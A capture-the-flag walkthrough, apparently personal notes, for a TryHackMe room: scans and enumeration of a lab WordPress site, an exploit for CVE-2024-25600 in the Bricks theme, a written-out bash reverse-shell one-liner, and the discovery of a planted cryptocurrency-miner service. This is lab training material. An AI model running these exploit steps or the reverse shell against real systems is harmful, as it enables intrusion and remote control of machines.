<code>
https://tryhackme.com/r/room/tryhack3mbricksheist

Note: Add 10.10.207.101 bricks.thm to your /etc/hosts file.

## Service Enumeration

└─$ nmap  -sV -Pn  bricks.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-18 07:13 CDT
Nmap scan report for bricks.thm (10.10.207.101)
Host is up (0.041s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql    MySQL (unauthorized)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
└─$ nmap  -sV -Pn  bricks.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-18 07:13 CDT
Nmap scan report for bricks.thm (10.10.207.101)
Host is up (0.041s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql    MySQL (unauthorized)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=4/18%Time=66210E70%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,291,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20
SF:rver\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\x20\x20
SF:\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

┌(duke kali) [/Documents/THM_BrickByBrick]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://bricks.thm -x .php, .txt, .html -k | egrep -v "Status: 301"
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     https://bricks.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,
[+] Timeout:                 10s

/login                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-login.php]
/login.php            (Status: 302) [Size: 0] [--> https://bricks.thm/wp-login.php]
/admin                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-admin/]                 
/wp-login.php         (Status: 200) [Size: 4042]                                                 
/dashboard            (Status: 302) [Size: 0] [--> https://bricks.thm/wp-admin/]  

### Found Wordpress app

## Wordpress Enumeration
                                                                                                                                                  
┌──(duke㉿kali)-[~]
└─$ wpscan --url https://bricks.thm --enumerate u --disable-tls-checks 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: https://bricks.thm/ [10.10.119.30]
[+] Started: Fri Apr 19 05:54:19 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:00:28 <==========================================================================================================================================================> (708 / 708) 100.00% Time: 00:00:28
[i] The WordPress version could not be detected.

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] administrator
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - https://bricks.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Apr 19 05:54:53 2024
[+] Requests Done: 1332
[+] Cached Requests: 11
[+] Data Sent: 354.176 KB
[+] Data Received: 28.813 MB
[+] Memory used: 227.711 MB
[+] Elapsed time: 00:00:34

### Found Brick theme 1.9.5 -- vulneable by CVE-2024-25600
use exploit from 
https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_BrickByBrick]
└─$ python3 CVE-2024-25600.py -u https://bricks.thm

V případě rozšíření na plnohodnotný reveshell při použiti exploitu
### bash -c 'exec bash -i &>/dev/tcp/10.9.30.202/9002 <&1'


### print running proccess

Shell> ps -fax
    PID TTY      STAT   TIME COMMAND
      2 ?        S      0:00 [kthreadd]
      3 ?        I<     0:00  \_ [rcu_gp]
      4 ?        I<     0:00  \_ [rcu_par_gp]
      5 ?        I<     0:00  \_ [slub_flushwq]
      6 ?        I<     0:00  \_ [netns]
      8 ?        I<     0:00  \_ [kworker/0:0H-kblockd]
     10 ?        I<     0:00  \_ [mm_percpu_wq]
     11 ?        S      0:00  \_ [rcu_tasks_rude_]
     12 ?        S      0:00  \_ [rcu_tasks_trace]
     13 ?        S      0:00  \_ [ksoftirqd/0]
     14 ?        I      0:05  \_ [rcu_sched]
     15 ?        S      0:00  \_ [migration/0]
     16 ?        S      0:00  \_ [idle_inject/0]
     18 ?        S      0:00  \_ [cpuhp/0]
     19 ?        S      0:00  \_ [cpuhp/1]
     20 ?        S      0:00  \_ [idle_inject/1]
     21 ?        S      0:00  \_ [migration/1]
     22 ?        S      0:00  \_ [ksoftirqd/1]
     24 ?        I<     0:00  \_ [kworker/1:0H-events_highpri]
     25 ?        S      0:00  \_ [kdevtmpfs]
     26 ?        I<     0:00  \_ [inet_frag_wq]
     27 ?        S      0:00  \_ [kauditd]
     28 ?        S      0:00  \_ [khungtaskd]
     29 ?        S      0:00  \_ [oom_reaper]
     30 ?        I<     0:00  \_ [writeback]
     31 ?        S      0:00  \_ [kcompactd0]
     32 ?        SN     0:00  \_ [ksmd]
     33 ?        SN     0:00  \_ [khugepaged]
     80 ?        I<     0:00  \_ [kintegrityd]
     81 ?        I<     0:00  \_ [kblockd]
     82 ?        I<     0:00  \_ [blkcg_punt_bio]
     83 ?        S      0:00  \_ [xen-balloon]
     84 ?        I<     0:00  \_ [tpm_dev_wq]
     85 ?        I<     0:00  \_ [ata_sff]
     86 ?        I<     0:00  \_ [md]
     87 ?        I<     0:00  \_ [edac-poller]
     88 ?        I<     0:00  \_ [devfreq_wq]
     89 ?        S      0:00  \_ [watchdogd]
     91 ?        I<     0:00  \_ [kworker/1:1H-kblockd]
     95 ?        S      0:00  \_ [kswapd0]
     96 ?        S      0:00  \_ [ecryptfs-kthrea]
     98 ?        I<     0:00  \_ [kthrotld]
     99 ?        I<     0:00  \_ [acpi_thermal_pm]
    100 ?        S      0:00  \_ [xenbus]
    101 ?        S      0:00  \_ [xenwatch]
    102 ?        I<     0:00  \_ [nvme-wq]
    103 ?        I<     0:00  \_ [nvme-reset-wq]
    104 ?        I<     0:00  \_ [nvme-delete-wq]
    105 ?        S      0:00  \_ [scsi_eh_0]
    106 ?        I<     0:00  \_ [scsi_tmf_0]
    107 ?        S      0:00  \_ [scsi_eh_1]
    108 ?        I<     0:00  \_ [scsi_tmf_1]
    109 ?        I<     0:00  \_ [kworker/0:1H-kblockd]
    111 ?        I<     0:00  \_ [vfio-irqfd-clea]
    112 ?        I<     0:00  \_ [mld]
    113 ?        I<     0:00  \_ [ipv6_addrconf]
    122 ?        I<     0:00  \_ [kstrp]
    125 ?        I<     0:00  \_ [zswap-shrink]
    126 ?        I<     0:00  \_ [kworker/u31:0]
    131 ?        I<     0:00  \_ [charger_manager]
    132 ?        S      0:00  \_ [jbd2/xvda1-8]
    133 ?        I<     0:00  \_ [ext4-rsv-conver]
    197 ?        I      0:00  \_ [kworker/1:6-events]
    239 ?        I<     0:00  \_ [cryptd]
    330 ?        I<     0:00  \_ [kaluad]
    331 ?        I<     0:00  \_ [kmpath_rdacd]
    332 ?        I<     0:00  \_ [kmpathd]
    333 ?        I<     0:00  \_ [kmpath_handlerd]
   2547 ?        I      0:00  \_ [kworker/0:2-cgroup_destroy]
   9167 ?        I      0:00  \_ [kworker/1:1-cgroup_destroy]
   9173 ?        I      0:00  \_ [kworker/u30:0-events_unbound]
   9209 ?        I      0:00  \_ [kworker/0:1-events]
   9215 ?        I      0:00  \_ [kworker/u30:2-writeback]
   9227 ?        I      0:00  \_ [kworker/0:0-cgroup_destroy]
      1 ?        Ss     0:04 /sbin/init
    175 ?        S<s    0:00 /lib/systemd/systemd-journald
    216 ?        Ss     0:00 /lib/systemd/systemd-udevd
    334 ?        SLsl   0:00 /sbin/multipathd -d -s
    370 ?        Ssl    0:00 /lib/systemd/systemd-timesyncd
    461 ?        Ss     0:00 /lib/systemd/systemd-networkd
    510 ?        Ss     0:00 /lib/systemd/systemd-resolved
    554 ?        Ssl    0:00 /usr/lib/accountsservice/accounts-daemon
    555 ?        Ss     0:00 /usr/sbin/acpid
    557 ?        Ss     0:00 avahi-daemon: running [tryhackme.local]
    618 ?        S      0:00  \_ avahi-daemon: chroot helper
    560 ?        Ss     0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
    561 ?        Ssl    0:00 /usr/sbin/NetworkManager --no-daemon
    569 ?        Ssl    0:00 /usr/sbin/irqbalance --foreground
    570 ?        Ss     0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
    571 ?        Ssl    0:00 /usr/lib/policykit-1/polkitd --no-debug
    574 ?        Ssl    0:00 /usr/sbin/rsyslogd -n -iNONE
    575 ?        Ssl    0:01 /usr/lib/snapd/snapd
    576 ?        Ssl    0:00 /usr/libexec/switcheroo-control
    577 ?        Ss     0:00 /lib/systemd/systemd-logind
    579 ?        Ssl    0:00 /usr/lib/udisks2/udisksd
    580 ?        Ss     0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
    652 ?        Ss     0:00 /usr/sbin/cupsd -l
    671 ?        Ssl    0:00 /usr/sbin/cups-browsed
    675 ?        Ssl    0:00 /usr/sbin/ModemManager
    696 ?        Ssl    0:01 /snap/amazon-ssm-agent/7983/amazon-ssm-agent
    698 ?        Ssl    0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
    729 ?        Ss     0:00 /usr/sbin/cron -f
    746 ?        Ssl    0:00 /usr/bin/whoopsie -f
    749 ?        Ss     0:00 /usr/sbin/atd -f
    769 ttyS0    Ss+    0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
    791 tty1     Ss+    0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
    793 ?        Ssl    0:00 /usr/sbin/lightdm
    855 tty7     Ssl+   0:03  \_ /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
   1668 ?        Sl     0:00  \_ lightdm --session-child 17 20
   1697 ?        Ss     0:00  |   \_ /bin/sh /usr/lib/lightdm/lightdm-greeter-session /usr/sbin/slick-greeter
   1698 ?        Sl     0:07  |       \_ /usr/sbin/slick-greeter
   1816 ?        S      0:00  \_ lightdm --session-child 13 20
    807 ?        Ss     0:00 /usr/sbin/kerneloops --test
    809 ?        Ss     0:00 /usr/sbin/kerneloops
    871 ?        Ss     0:00 /lib/systemd/systemd --user
    872 ?        S      0:00  \_ (sd-pam)
   1317 ?        Ss     0:00  \_ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
    881 ?        S      0:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --datadir=/usr/local/mysql/data --pid-file=/usr/local/mysql/data/mysql.pid
   1250 ?        Sl    10:20  \_ /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib64/plugin --user=mysql --log-error=/usr/local/mysql/data/mysql-error.log --open-files-limit=2048 --pid-file=/usr/local/mysql/data/mysql.pid --socket=/tmp/mysql.sock --port=3306
   1282 ?        SNsl   0:00 /usr/libexec/rtkit-daemon
   1311 ?        S      0:01 /usr/bin/Xtigervnc :1 -desktop tryhackme:1 (ubuntu) -auth /home/ubuntu/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /home/ubuntu/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth
   1338 ?        S      0:11 python3 -m websockify 80 localhost:5901 -D
   1341 ?        Ss     0:00 /usr/local/apache/bin/httpd -k start
   1409 ?        Sl     6:30  \_ /usr/local/apache/bin/httpd -k start
   1410 ?        Sl     3:43  \_ /usr/local/apache/bin/httpd -k start
   1411 ?        Sl    17:31  \_ /usr/local/apache/bin/httpd -k start
   2266 ?        Sl    95:15  \_ /usr/local/apache/bin/httpd -k start
   9238 ?        S      0:00      \_ sh -c cd '/data/www/default' ; ps -fax
   9239 ?        R      0:00          \_ ps -fax
   1407 ?        Ss     0:00 sshd: /usr/sbin/sshd -D -o AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys %u %f -o AuthorizedKeysCommandUser ec2-instance-connect [listener] 0 of 10-100 startups
   1657 ?        Sl     0:00 mate-session
   1794 ?        Sl     0:03  \_ /usr/bin/mate-settings-daemon
   1815 ?        Sl     0:00  \_ marco
   1828 ?        Sl     0:00  \_ mate-panel
   1873 ?        Sl     0:00  \_ /usr/bin/caja
   1879 ?        Sl     0:00  \_ mate-maximus
   1882 ?        Sl     0:00  \_ /usr/lib/x86_64-linux-gnu/indicator-power/indicator-power-service
   1894 ?        Sl     0:00  \_ /usr/lib/x86_64-linux-gnu/polkit-mate/polkit-mate-authentication-agent-1
   1904 ?        Sl     0:00  \_ /usr/lib/x86_64-linux-gnu/indicator-application/indicator-application-service
   1906 ?        Sl     0:00  \_ /usr/bin/python3 /usr/bin/blueman-applet
   1914 ?        Sl     0:00  \_ /usr/lib/x86_64-linux-gnu/indicator-messages/indicator-messages-service
   1917 ?        Sl     0:00  \_ update-notifier
   1918 ?        Sl     0:00  \_ /usr/libexec/evolution-data-server/evolution-alarm-notify
   1919 ?        Sl     0:00  \_ /usr/lib/x86_64-linux-gnu/indicator-session/indicator-session-service
   1931 ?        Sl     0:00  \_ /usr/libexec/geoclue-2.0/demos/agent
   1946 ?        Sl     0:00  \_ /usr/lib/x86_64-linux-gnu/indicator-datetime/indicator-datetime-service
   1975 ?        S      0:00  \_ /usr/bin/python3 /usr/share/system-config-printer/applet.py
   1985 ?        Sl     0:00  \_ /usr/lib/x86_64-linux-gnu/indicator-sound/indicator-sound-service
   1989 ?        Sl     0:00  \_ mate-screensaver
   2015 ?        Sl     0:00  \_ nm-applet
   2026 ?        Sl     0:00  \_ plank
   1660 ?        S      0:00 dbus-launch --exit-with-session mate-session
   1661 ?        Ss     0:00 /usr/bin/dbus-daemon --syslog --fork --print-pid 5 --print-address 7 --session
   1672 ?        Ss     0:00 /lib/systemd/systemd --user
   1673 ?        S      0:00  \_ (sd-pam)
   1683 ?        S<sl   0:00  \_ /usr/bin/pulseaudio --daemonize=no --log-target=journal
   1687 ?        Ss     0:00  \_ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
   1725 ?        Sl     0:00  \_ /usr/libexec/dconf-service
   1758 ?        Ssl    0:00  \_ /usr/libexec/gvfsd
   1763 ?        Sl     0:00  \_ /usr/libexec/gvfsd-fuse /run/user/114/gvfs -f -o big_writes
   1682 ?        Sl     0:00 /usr/libexec/gvfsd
   2112 ?        Sl     0:00  \_ /usr/libexec/gvfsd-trash --spawner :1.1 /org/gtk/gvfs/exec_spaw/0
   1696 ?        Sl     0:00 /usr/libexec/gvfsd-fuse /home/ubuntu/.cache/xdg/gvfs -f -o big_writes
   1708 ?        Sl     0:00 /usr/libexec/at-spi-bus-launcher
   1713 ?        S      0:00  \_ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
   1747 ?        Sl     0:00 /usr/libexec/at-spi-bus-launcher --launch-immediately
   1752 ?        S      0:00  \_ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
   1782 ?        Sl     0:00 /usr/libexec/dconf-service
   1790 ?        Sl     0:00 gnome-keyring-daemon --start
   1796 ?        Sl     0:00 /usr/libexec/at-spi2-registryd --use-gnome-session
   1809 ?        Ssl    0:00 /usr/lib/upower/upowerd
   1818 ?        Sl     0:00 /usr/libexec/at-spi2-registryd --use-gnome-session
   1846 ?        Sl     0:00 /usr/libexec/gvfs-udisks2-volume-monitor
   1852 ?        Sl     0:00 /usr/libexec/gvfs-afc-volume-monitor
   1858 ?        Sl     0:00 /usr/libexec/gvfs-mtp-volume-monitor
   1863 ?        Sl     0:00 /usr/libexec/gvfs-gphoto2-volume-monitor
   1868 ?        Sl     0:00 /usr/libexec/gvfs-goa-volume-monitor
   1872 ?        Sl     0:00 /usr/libexec/goa-daemon
   1997 ?        Sl     0:00 /usr/libexec/goa-identity-service
   2025 ?        Sl     0:00 /usr/libexec/evolution-source-registry
   2046 ?        Sl     0:00 /usr/bin/python3 /usr/bin/blueman-tray
   2074 ?        S      0:00 /bin/bash /usr/lib/x86_64-linux-gnu/bamf/bamfdaemon-dbus-runner
   2075 ?        Sl     0:00  \_ /usr/lib/x86_64-linux-gnu/bamf/bamfdaemon
   2092 ?        Sl     0:00 /usr/lib/mate-panel/clock-applet
   2093 ?        Sl     0:00 /usr/lib/mate-panel/notification-area-applet
   2119 ?        Sl     0:00 /usr/libexec/evolution-calendar-factory
   2131 ?        Sl     0:00 /usr/libexec/evolution-addressbook-factory
   2164 ?        Sl     0:00 /usr/libexec/gvfsd-metadata
   2226 ?        SNl    0:07 /usr/bin/python3 /usr/bin/update-manager --no-update --no-focus-on-map
   9228 ?        Ss     0:00 /lib/NetworkManager/nm-inet-dialog
   9229 ?        S      0:01  \_ /lib/NetworkManager/nm-inet-dialog

### Print running services

systemctl list-units --type=service --state=running
found
ubuntu.service                                 loaded active running TRYHACK3M       

### Go to 
apache@tryhackme:/etc/systemd/system$ ls
sshd.service
sysinit.target.wants
syslog.service
timers.target.wants
ubuntu.service
vmtoolsd.service

### Print conf
apache@tryhackme:/etc/systemd/system$ cat ubuntu.service
cat ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target

### Go to
apache@tryhackme:/lib/NetworkManager$ ls 
ls
VPN
conf.d
dispatcher.d
inet.conf
nm-dhcp-helper
nm-dispatcher
nm-iface-helper
nm-inet-dialog
nm-initrd-generator
nm-openvpn-auth-dialog
nm-openvpn-service
nm-openvpn-service-openvpn-helper
nm-pptp-auth-dialog
nm-pptp-service
system-connections

### print
apache@tryhackme:/lib/NetworkManager$ head inet.conf
head inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()



<\code>
